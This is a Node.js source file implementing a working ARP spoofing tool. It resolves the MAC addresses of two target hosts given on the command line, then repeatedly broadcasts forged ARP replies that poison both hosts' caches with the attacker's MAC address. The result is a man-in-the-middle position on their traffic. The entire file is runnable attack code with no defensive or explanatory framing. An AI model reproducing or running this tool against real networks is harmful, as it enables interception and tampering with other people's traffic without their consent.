"use strict";

var Cap = require('cap').Cap,
  ip = require("ip"),
  timers = require("timers"),
  device = Cap.findDevice(ip.address()),
  getmac = require('getmac').getMac,
  filter = 'arp',
  bufSize = 10 * 1024 * 1024,
  socketBuffer = new Buffer(65535),
  OPERATION = {
    REQUEST:  1,
    REPLY: 2
  },
  attacker = {
    ip: ip.address(),
    mac: null
  };

var target1 = {},
  target2 = {},
  interval = null;

if(process.argv.length > 1) {
  target1.ip = process.argv[2];
  target2.ip = process.argv[3];
  if(typeof process.argv[4] !== "undefined") {
    interval = parseInt(process.argv[4]) * 1000;
  }
}

getmac(function(err, macAddr) {
  // Request example
  var target1_mac, target2_mac, response;
  attacker.mac = macAddr;

  arpRequest(target1, (nbytes, buf, close) => {
    var response = createARPPacket(buf);
    if(response.arp.operation.readInt16BE(0) !== OPERATION.REPLY) {
      return;
    }

    target1.mac = buf2macString(response.arp.src_mac);
    close();
    console.log("MAC found for target 1:\t", target1.mac);

    arpRequest(target2, (nbytes, buf, close) => {
      response = createARPPacket(buf);
      target2.mac = buf2macString(response.arp.src_mac);
      close();
      console.log("MAC found for target 2:\t", target2.mac);
      // Poisoning example
      if(target1 !== null && target2 !== null) {
        if(interval !== null) {
          console.log("\nStarting ARP replies every " + interval + " milliseconds");
          setInterval(spoofBothWays, interval, target1, target2, macAddr);
        }

        spoofBothWays(target1, target2, macAddr);

        if(interval === null) {
          process.exit();
        } else {
          // Stick around for the interval
        }
      }
    });
  });
});

var spoofBothWays = (target1, target2, mac) => {
  spoof(target1, target2, mac);
  spoof(target2, target1, mac);
};

var spoof = function (src, dst, mac) {
  // Send reply from target1 to broadcast, advertising new hardware address
  var packet = createARPPacket();

  packet.arp.operation.writeUIntBE(OPERATION.REPLY, 0, 2);

  setMac(packet.arp.dst_mac, "FF-FF-FF-FF-FF-FF");
  setMac(packet.eth.dst_mac, "FF-FF-FF-FF-FF-FF");

  setMac(packet.arp.src_mac, mac);
  setMac(packet.eth.src_mac, mac);

  setIP(packet.arp.src_ip, src.ip);
  setIP(packet.arp.dst_ip, dst.ip);

  send(packet.buffer);


  // Fix our own ARP stack
  setMac(packet.arp.dst_mac, attacker.mac);
  setMac(packet.eth.dst_mac, attacker.mac);
  setIP(packet.arp.dst_ip, attacker.ip);

  setMac(packet.eth.src_mac, dst.mac);
  setMac(packet.arp.src_mac, dst.mac);
  setIP(packet.arp.src_ip, dst.ip);

  send(packet.buffer);
};

var arpRequest = function(target, callback) {
  var c = new Cap();
  var packet = createARPPacket();

  packet.arp.operation.writeUIntBE(OPERATION.REQUEST, 0, 2);

  packet.arp.dst_mac.writeUIntBE(0xFFFFFFFFFFFF, 0, packet.arp.dst_mac.length);
  packet.eth.dst_mac.writeUIntBE(0xFFFFFFFFFFFF, 0, packet.arp.dst_mac.length);

  setMac(packet.eth.src_mac, attacker.mac);
  setMac(packet.arp.src_mac, attacker.mac);

  setIP(packet.arp.src_ip, attacker.ip);
  setIP(packet.arp.dst_ip, target.ip);

  c.open(device, filter, bufSize, socketBuffer);
  c.setMinBytes(42); // Length of an ARP packet
  console.log("\n\nSending ARP Request for ", target.ip);
  c.send(packet.buffer, packet.buffer.length);
  c.on("packet", (nbytes) => {
    callback(nbytes, socketBuffer, () => { c.close(); });
  });
};

var send = function(buffer) {
  var c = new Cap();
  try {
    console.log("Sending reply:", buffer);
    c.open(device, filter, bufSize, socketBuffer);
    c.send(buffer, buffer.length);
    c.close();
  } catch (e) {
    console.log("Error sending packet:", e);
  }
};

var setMac = function (buffer, addr) {
  // Poorly named; goes from the string "FF-FF-FF-FF-FF-FF" to 0xFFFFFFFFFFFF, then writes that value to buffer
  var mac = parseInt(addr.split("-").join(""), 16);
  buffer.writeUIntBE(mac, 0, 6);
};

var setIP = function(buffer, ip) {
  var ip_blocks = ip.toString().split(".");
  for(var i = 0; i < ip_blocks.length; i++) {
    buffer.writeUIntBE(parseInt(ip_blocks[i]), i, 1);
  }
};

var buf2macString = function(buf) {
  // Takes a buffer containing a MAC address, gives it back as a hyphen-delimited string, e.g. "FF-FF-FF-FF-FF-FF"
  return buf.toString('hex').match(/.{1,2}/g).join('-');
};

var createARPPacket = function(buf) {
  var buffer = buf;
  if(typeof buffer === "undefined") {
    buffer = new Buffer([
      // ETHERNET
      0xff, 0xff, 0xff, 0xff, 0xff,0xff,                  // 0    = Destination MAC
      0x84, 0x8F, 0x69, 0xB7, 0x3D, 0x92,                 // 6    = Source MAC
      0x08, 0x06,                                         // 12   = EtherType = ARP
      // ARP
      0x00, 0x01,                                         // 14/0   = Hardware Type = Ethernet (or wifi)
      0x08, 0x00,                                         // 16/2   = Protocol type = ipv4 (request ipv4 route info)
      0x06, 0x04,                                         // 18/4   = Hardware Addr Len (Ether/MAC = 6), Protocol Addr Len (ipv4 = 4)
      0x00, 0x01,                                         // 20/6   = Operation (ARP, who-has)
      0x84, 0x8f, 0x69, 0xb7, 0x3d, 0x92,                 // 22/8   = Sender Hardware Addr (MAC)
      0xc0, 0xa8, 0x01, 0xc8,                             // 28/14  = Sender Protocol address (ipv4)
      0x00, 0x00, 0x00, 0x00, 0x00, 0x00,                 // 32/18  = Target Hardware Address (Blank/nulls for who-has)
      0xc0, 0xa8, 0x01, 0xc9                              // 38/24  = Target Protocol address (ipv4)
    ]);
  }

  var packet = {
    eth: {
      dst_mac: buffer.slice(0,6),
      src_mac: buffer.slice(6,12),
      ethertype: buffer.slice(12,14)
    },
    arp: {
      hardwareType: buffer.slice(14,16),
      protocol: buffer.slice(16,18),
      hardwareAddressLen: buffer.slice(18,20),
      operation: buffer.slice(20,22),
      src_mac: buffer.slice(22,28),
      src_ip: buffer.slice(28,32),
      dst_mac: buffer.slice(32,38),
      dst_ip: buffer.slice(38,42)
    }
  };

  packet.buffer = buffer;

  return packet;
};
  